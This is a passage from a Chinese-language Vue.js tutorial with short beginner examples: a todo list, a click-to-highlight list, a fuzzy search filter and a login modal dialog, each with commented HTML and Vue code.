    var app = Vue.createApp(obj).mount("#box")   // 将 Vue 实例挂载到指定的 DOM 元素上
</script>
</body>
</html>

```

上面的代码通过 Vue.js 实现了一个具有添加和删除待办事项功能的 Todolist。其中，通过双向绑定将输入框的值与数据对象中的 `mytext` 属性关联起来，使用 `v-model` 实现了数据的双向绑定。通过 `v-for` 指令遍历 `datalist` 数组，将每个待办事项渲染为列表项。通过点击按钮触发相应的方法实现添加和删除待办事项的功能。当待办事项列表为空时，显示相应的提示信息。

### 案例三:点击变心案例 --是变色

```vue
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="vue.js"></script>
    <style>
        .active{
            background-color: red;
        }
    </style>
</head>

<body>
<div id="box">
    <ul>
        <!-- 使用 v-for 指令遍历 datalist 数组，渲染为列表项 -->
        <li v-for="item,index in datalist" :class="current===index?'active':'' " @click="handleClick(index)">
            <!-- 显示待办事项的内容 -->
            {{item}}
        </li>
    </ul>
</div>
<script>
    // 创建 Vue 实例
    var obj = {
        data() {
            // 数据对象，包含待办事项列表的数据和当前点击的索引值
            return {
                datalist:["11","22","33"], // 待办事项列表的数据
                current:0                   // 当前点击的索引值
            }
        },
        methods: {
            // 点击待办事项触发的方法
            handleClick(index){
                this.current = index     // 将当前点击的索引值赋给 current
            }
        }
    }
    var app = Vue.createApp(obj).mount("#box")   // 将 Vue 实例挂载到指定的 DOM 元素上
</script>
</body>
</html>

```

### 案例三: 实现一个模糊搜索

实现一个简单的模糊搜索功能，需求如下：

1. 在一个HTML页面中，有一个输入框和一个无序列表。
2. 用户可以在输入框中输入关键词，用于进行模糊搜索。
3. 根据用户输入的关键词，列表中会显示与关键词匹配的项。
4. 初始时，列表展示了一个预定义的数据集。
5. 当用户输入关键词时，列表会动态更新，只显示包含关键词的项。

```vue
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>模糊搜索案例</title>
    <script src="vue.js"></script>
</head>
<body>
<div id="box">
    <input type="text" v-model="keyword" > <!-- 输入框，使用v-model将输入框的值与keyword变量进行双向绑定 -->
    <ul>
        <li v-for="item in handleData()" :key="item" > <!-- 使用v-for指令遍历经过handleData方法处理后的数据集 -->
            {{item}} <!-- 显示匹配的项 -->
        </li>
    </ul>
</div>

<script>
    var obj  = {
        data() {
            return {
                keyword: "", // 存储用户输入的关键词
                datalist: [ // 预定义的数据集
                    "jack",
                    "jerry",
                    "jason",
                    "james",
                    "jordan",
                    "jackson",
                    "mark",
                    "mike",
                    "alice",
                    "bat",
                    "bite"
                ]
            };
        },

        methods: {
            handleData() {
                // 根据关键词过滤数据集，返回匹配的项
                return this.datalist.filter(item =>
                    item.includes(this.keyword)
                );
            }
        }
    };

    // 创建Vue实例，将其挂载到id为"box"的元素上
    Vue.createApp(obj).mount("#box");
</script>
</body>
</html>
```

### 案例四:实现一个登录模态框

需求:实现一个模态框的功能，当用户点击页面上的按钮时，模态框出现；当用户在模态框内输入用户名并点击登录，或者点击模态框以外的区域时，模态框消失。

```vue
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <title>vue</title>
    <script src="vue.js"></script>
    <style>
        #overlay {
            background: rgba(0, 0, 0, 0.6);
            width: 100%;
            margin: auto;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
        }

        #center {
            background: #ffff;
            border-radius: 5px;
            /* 边框圆角 */
            padding-top: 15px;
            padding-left: 30px;
            padding-bottom: 15px;
            width: 290px;
            height: 160px;
            position: fixed;
            margin: auto;
            left: 0;
            right: 0;
            top: 0;
            bottom: 0;
        }
    </style>
</head>

<body>
    <div id="box">
        <button @click="isShow=!isShow">模态框</button>
        <!-- <div id="overlay" v-show="isShow" @click="isShow=false">
            <div id="center" @click.stop>
                用户名:<input/>
                <button @click="isShow=false">登录</button>
            </div>
       </div> -->
        <div id="overlay" v-show="isShow" @click.self="isShow=false">
            <div id="center" >
                用户名:<input />
                <button @click="isShow=false">登录</button>
            </div>
        </div>
    </div>

    <script>
        var obj = {
            data() {
                return {
                    isShow: false
                }
            }
        }

        Vue.createApp(obj).mount("#box")
    </script>
</body>

</html>
```

